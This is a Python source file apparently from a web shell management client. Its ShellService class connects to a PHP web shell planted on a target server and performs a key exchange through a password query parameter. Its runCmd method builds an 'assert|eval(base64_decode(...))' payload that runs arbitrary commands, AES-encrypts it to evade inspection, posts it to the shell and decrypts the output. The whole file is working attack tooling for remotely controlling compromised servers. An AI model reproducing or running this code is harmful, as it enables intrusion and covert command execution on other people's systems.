# -*- encoding: utf-8 -*-
"""
@File    :   ShellService.py    
@Modify Time          @Author      @Version    
------------        -----------    --------    
2021/3/8 22:50      flandre2333      1.0

@Description
-----------
   None
"""

from core.ShellEntity import ShellEntity
from core.Types import LanguageType
import random
from components.Request import RequestUtils
from components.Request import ResponseField
from components.ReadFile import ReadFile
from components.Cryto import Base64Crypt
from components.Cryto import AESCrypt
import json


class ShellService:
    def __init__(self, shellEntity: ShellEntity, userAgent, isUseProxies=False, **kwargs):
        self.shellEntity: ShellEntity = shellEntity
        self.userAgent: str = userAgent
        self.currentUrl: str = shellEntity.url
        self.currentType: LanguageType = shellEntity.languageType
        self.currentPassword: str = shellEntity.password
        self.currentHeaders: dict = {'UserAgent': userAgent}
        self.currentIsUseProxies: bool = isUseProxies

        if self.currentIsUseProxies:
            self.currentProxies = kwargs['proxies']
        else:
            self.currentProxies = None

        if self.currentType is LanguageType.PHP:
            self.currentHeaders['Content-type'] = 'application/x-www-form-urlencoded'
        # 连接
        self.currentKey = self._TryConnect_()

    def _TryConnect_(self):
        if self.currentUrl.count('?'):
            url = self.currentUrl + '&' + self.currentPassword + '=' + str(int(random.random() * 1000))
        else:
            url = self.currentUrl + '?' + self.currentPassword + '=' + str(int(random.random() * 1000))
        resp = RequestUtils.SendRequest(url=url, headers=self.currentHeaders, isUseProxies=self.currentIsUseProxies)

        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) == 200:
            self.currentHeaders['Cookie'] = RequestUtils.ParseResponse(resp, ResponseField.cookie, cookieToStr=True)
            return RequestUtils.ParseResponse(resp, ResponseField.body)
        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) == 302:
            pass
        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) == 404:
            pass
        if RequestUtils.ParseResponse(resp, ResponseField.statusCode) >= 500:
            pass

    def runCmd(self, Cmd: str):
        data = ReadFile('/playload/Cmd.php')
        if self.currentType is LanguageType.PHP:
            data = data + '$Cmd="{0}";\nmain($Cmd);'.format(Cmd)
            base64Content = Base64Crypt.Base64Encode(data)
            plaintextData = "assert|eval(base64_decode('" + base64Content.replace('\n', '') + "'));"
            aesCrypt = AESCrypt(self.currentKey)
            aesEncryptData = aesCrypt.aes_encrypt(plaintextData)
            resp = RequestUtils.SendRequest(self.currentUrl, self.currentHeaders, method='post',
                                            data=aesEncryptData, isUseProxies=self.currentIsUseProxies,
                                            proxies=self.currentProxies)
            encryptContent = RequestUtils.ParseResponse(resp, ResponseField.body)
            decryptContent = aesCrypt.aes_decrypt(encryptContent)
            respDict = json.loads(decryptContent)
            for k, v in respDict.items():
                respDict[k] = Base64Crypt.Base64Decode(v)
            return respDict
        if self.currentType is LanguageType.JAVA:
            pass
        else:
            pass
